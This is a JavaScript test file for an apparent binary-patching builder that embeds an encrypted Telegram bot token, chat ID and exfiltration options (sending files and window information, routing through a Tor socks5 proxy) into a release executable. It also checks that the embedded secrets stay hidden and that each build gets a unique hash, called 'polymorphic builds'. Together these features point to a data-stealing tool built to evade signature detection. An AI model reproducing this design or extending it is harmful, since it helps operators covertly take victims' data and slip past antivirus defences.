/*
 * Copyright (C) 2026 Antonio Ricciardi
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import test from "node:test";

import { chacha20Crypt, crc32, EMBEDDED_KEY, encodePayload, locateRegion, patchBinary, VERSION } from "../docs/provision.mjs";

const [, , executable] = process.argv;

test("CRC32 matches the standard vector", () => {
  assert.equal(crc32(new TextEncoder().encode("123456789")), 0xcbf43926);
});

test("payload keys are validated and sorted", () => {
  assert.equal(
    new TextDecoder().decode(encodePayload({ TELEGRAM_ENABLED: "1", C2T_VERBOSE: "0", C2T_DELIVERY_ATTEMPTS: "3" })),
    "C2T_DELIVERY_ATTEMPTS=3\nC2T_VERBOSE=0\nTELEGRAM_ENABLED=1\n",
  );
  assert.throws(() => encodePayload({ C2T_QUEUE_MAX_ITEMS: "0" }), /positive/);
  assert.throws(() => encodePayload({ UNKNOWN_KEY: "value" }), /Unknown configuration key/);
  assert.throws(() => encodePayload({ TELEGRAM_CHAT_ID: "bad\nvalue" }), /forbidden/);
});

test("browser patch writes a valid encrypted configuration into the release binary", () => {
  assert.ok(executable, "CMake must pass an executable path");
  const config = {
    C2T_DELIVERY_ATTEMPTS: "5",
    C2T_VERBOSE: "0",
    TELEGRAM_BOT_TOKEN: "123456:test-token",
    TELEGRAM_CHAT_ID: "-1001234567890",
    TELEGRAM_DEDUPLICATE: "1",
    TELEGRAM_ENABLED: "1",
    TELEGRAM_SEND_FILES: "0",
    TELEGRAM_SEND_WINDOW_INFO: "1",
    C2T_PROXY: "socks5://127.0.0.1:9050",
  };
  const source = readFileSync(executable);
  const output = patchBinary(source, config, { randomize: false });
  const offset = locateRegion(output);
  const payload = encodePayload(config);
  const view = new DataView(output.buffer, output.byteOffset, output.byteLength);

  assert.equal(output.length, source.length);
  assert.equal(view.getUint32(offset + 16, true), VERSION);
  assert.equal(view.getUint32(offset + 20, true), 12 + payload.length);
  
  const encryptedPayload = output.subarray(offset + 32, offset + 32 + 12 + payload.length);
  assert.equal(view.getUint32(offset + 24, true), crc32(encryptedPayload));

  // Ensure secrets are NOT in plaintext in the binary
  const binaryString = new TextDecoder("utf-8", { fatal: false }).decode(output);
  assert.ok(!binaryString.includes("123456:test-token"));
  assert.ok(!binaryString.includes("TELEGRAM_BOT_TOKEN="));

  // Decrypt and verify matching plaintext
  const nonce = encryptedPayload.subarray(0, 12);
  const ciphertext = encryptedPayload.subarray(12);
  const decrypted = chacha20Crypt(EMBEDDED_KEY, nonce, 0, ciphertext);
  assert.deepEqual(decrypted, payload);

  assert.ok(output.subarray(offset + 32 + 12 + payload.length, offset + 32 + 4096).every((byte) => byte === 0));
});

test("browser patch generates unique SHA hashes on consecutive generations (polymorphic builds)", () => {
  assert.ok(executable, "CMake must pass an executable path");
  const config = {
    TELEGRAM_BOT_TOKEN: "123456:test-token",
    TELEGRAM_CHAT_ID: "-1001234567890",
    TELEGRAM_ENABLED: "1",
  };
  const source = readFileSync(executable);
  const build1 = patchBinary(source, config);
  const build2 = patchBinary(source, config);

  assert.equal(build1.length, source.length);
  assert.equal(build2.length, source.length);
  // Binary bytes must not be identical
  assert.notDeepEqual(build1, build2);

  // Both must have valid headers and valid CRC32
  const offset1 = locateRegion(build1);
  const view1 = new DataView(build1.buffer, build1.byteOffset, build1.byteLength);
  const len1 = view1.getUint32(offset1 + 20, true);
  const crc1 = view1.getUint32(offset1 + 24, true);
  const payload1 = build1.subarray(offset1 + 32, offset1 + 32 + len1);
  assert.equal(crc32(payload1), crc1);
  
  const decrypted1 = chacha20Crypt(EMBEDDED_KEY, payload1.subarray(0, 12), 0, payload1.subarray(12));
  assert.ok(new TextDecoder().decode(decrypted1).includes("C2T_NONCE="));
  assert.ok(new TextDecoder().decode(decrypted1).includes("123456:test-token"));

  const offset2 = locateRegion(build2);
  const view2 = new DataView(build2.buffer, build2.byteOffset, build2.byteLength);
  const len2 = view2.getUint32(offset2 + 20, true);
  const crc2 = view2.getUint32(offset2 + 24, true);
  const payload2 = build2.subarray(offset2 + 32, offset2 + 32 + len2);
  assert.equal(crc32(payload2), crc2);
  
  const decrypted2 = chacha20Crypt(EMBEDDED_KEY, payload2.subarray(0, 12), 0, payload2.subarray(12));
  assert.ok(new TextDecoder().decode(decrypted2).includes("C2T_NONCE="));
  assert.ok(new TextDecoder().decode(decrypted2).includes("123456:test-token"));
});

test("browser patch refuses to invalidate a Mach-O code signature", () => {
  const binary = new Uint8Array(48 + 32 + 4096);
  binary.set([0xcf, 0xfa, 0xed, 0xfe]);
  const view = new DataView(binary.buffer);
  view.setUint32(16, 1, true);
  view.setUint32(20, 16, true);
  view.setUint32(32, 0x1d, true);
  view.setUint32(36, 16, true);
  binary.set([
    0x43, 0x32, 0x54, 0x43, 0x46, 0x47, 0x00, 0xa7,
    0x31, 0xd5, 0x6c, 0x92, 0xe8, 0x4b, 0xf0, 0x1d,
  ], 48);
  view.setUint32(64, 1, true);
  assert.throws(() => patchBinary(binary, {}), /code signed/);
});
